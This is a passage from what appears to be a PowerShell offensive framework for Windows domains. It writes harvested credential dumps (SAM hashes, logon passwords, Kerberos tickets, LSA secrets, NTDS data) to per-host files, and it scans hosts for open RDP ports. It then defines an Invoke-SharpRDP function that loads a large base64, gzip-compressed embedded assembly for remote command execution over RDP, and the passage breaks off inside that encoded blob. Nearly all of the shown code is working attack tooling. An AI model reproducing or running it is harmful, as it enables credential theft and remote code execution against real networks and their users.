            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

}


################################################################################################################
################################################# Function: RDP ################################################
################################################################################################################
Function Method-RDP {
$ErrorActionPreference = "SilentlyContinue"
Write-Host

$MaxConcurrentJobs = $Threads
$RDPJobs = @()

# Setting up runspaces for Port Checking
$runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$RunSpaceScriptBlock = {
    param ($computerName, $Timeout)
    
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if ($connected) { return "Connected" }
    else { return "Unable to connect" }
}

foreach ($computer in $computers) {
    
    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = $Computer
    $OS = "BLANK"
    }
    
    $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
    })
}

$FailedComputers = @()

do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

            if ($result -eq "Unable to connect") {
                $FailedComputers += $runspace.ComputerName
                continue
            }
           
            # Cleanup for completed runspaces
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Final cleanup
$runspacePool.Close()
$runspacePool.Dispose()


foreach ($Computer in $Computers) {
    
    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }

    # Check if the computer is in the FailedComputers list
    if ($ComputerName -in $FailedComputers) {continue}

$ScriptBlock = {

            Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly)


function Invoke-SharpRDP{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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